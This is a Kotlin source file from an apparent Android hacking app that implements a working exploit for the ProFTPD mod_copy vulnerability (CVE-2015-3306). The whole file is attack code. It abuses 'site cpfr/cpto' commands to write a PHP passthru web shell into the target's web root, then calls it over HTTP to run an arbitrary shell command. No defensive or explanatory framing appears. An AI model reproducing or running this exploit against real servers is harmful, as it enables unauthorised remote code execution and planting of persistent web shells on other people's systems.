package me.smoothhacker.swampsploit.exploit

import android.util.Log
import me.smoothhacker.swampsploit.utils.ExploitContext
import java.io.BufferedInputStream
import java.io.InputStream
import java.io.PrintWriter
import java.net.*
import java.util.*
import kotlin.random.asKotlinRandom

class ProFTPD constructor(
    private val ctx: ExploitContext,
    private val tempPath: String = "/tmp",
    private val sitePath: String = "/var/www/html",
    private val payload: String = "touch PoCFile",
) {
    val random = Random().asKotlinRandom()
    val tag = "CVE-2015-3306"


    private fun randomAlphanumeric(length: Int): String {
        val alphanumeric = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        return String(Array(length) { alphanumeric[random.nextInt(alphanumeric.length)] }.toCharArray())
    }

    fun exploit(): Boolean {
        val get = randomAlphanumeric(5 + random.nextInt(3))
        val payloadName = randomAlphanumeric(5 + random.nextInt(3)) + ".php"

        val client = Socket()
        client.soTimeout = ctx.getTimeout().toInt()

        try {
            val i = InetSocketAddress(ctx.getHost(0), ctx.getPort().toInt())
            client.connect(i, ctx.getTimeout().toInt())
        } catch (e: Exception) {
            val address = ctx.getHost(0)
            val port = ctx.getPort()
            Log.w(tag, "$address:$port - Failed to establish connection.")
            return false
        }

        val input = client.getInputStream()
        val reader = input.bufferedReader()
        val writer = PrintWriter(client.getOutputStream(), true)

        try {
            if (!reader.readLine().contains("220")) {
                throw SocketTimeoutException()
            }
        } catch (e: SocketTimeoutException) {
            val address = ctx.getHost(0)
            val port = ctx.getPort()
            Log.w(tag, "$address:$port - Failed to retrieve 220 status.")
            return false
        }

        writer.println("site cpfr /proc/self/cmdline")
        var result = reader.readLine()
        try {
            if (!result.contains("350")) {
                throw SocketTimeoutException()
            }
        } catch (e: SocketTimeoutException) {
            val address = ctx.getHost(0)
            val port = ctx.getPort()
            Log.w(tag, "$address:$port - Failed copying from '/proc/self/cmdline'.")
            return false
        }

        writer.println("site cpto $tempPath/.<?php passthru(\$_GET['$get']);?>")
        result = reader.readLine()
        try {
            if (!result.contains("250")) {
                throw SocketTimeoutException()
            }
        } catch (e: SocketTimeoutException) {
            val address = ctx.getHost(0)
            val port = ctx.getPort()
            Log.w(tag, "$address:$port - Failed copying to '$tempPath'.")
            return false
        }

        writer.println("site cpfr $tempPath/.<?php passthru(\$_GET['$get']);?>")
        result = reader.readLine()
        try {
            if (!result.contains("350")) {
                throw SocketTimeoutException()
            }
        } catch (e: SocketTimeoutException) {
            val address = ctx.getHost(0)
            val port = ctx.getPort()
            Log.w(tag, "$address:$port - Failed copying from '$tempPath'.")
            return false
        }

        writer.println("site cpto $sitePath/$payloadName")
        result = reader.readLine()
        try {
            if (!result.contains("250")) {
                throw SocketTimeoutException()
            }
        } catch (e: SocketTimeoutException) {
            val address = ctx.getHost(0)
            val port = ctx.getPort()
            Log.w(tag, "$address:$port - Failed copying PHP payload to '$sitePath/$payloadName'.")
            return false
        }

        val address = ctx.getHost(0)
        val url = URL("http://$address/$payloadName?$get=${URLEncoder.encode("nohup $payload &")}")
        val urlConnection = url.openConnection() as HttpURLConnection
        try {
            val x: InputStream = BufferedInputStream(urlConnection.inputStream)
            x.reader().readLines().forEach { Log.w(tag, it) }
        } finally {
            urlConnection.disconnect()
        }

        client.close()
        return true
    }
}
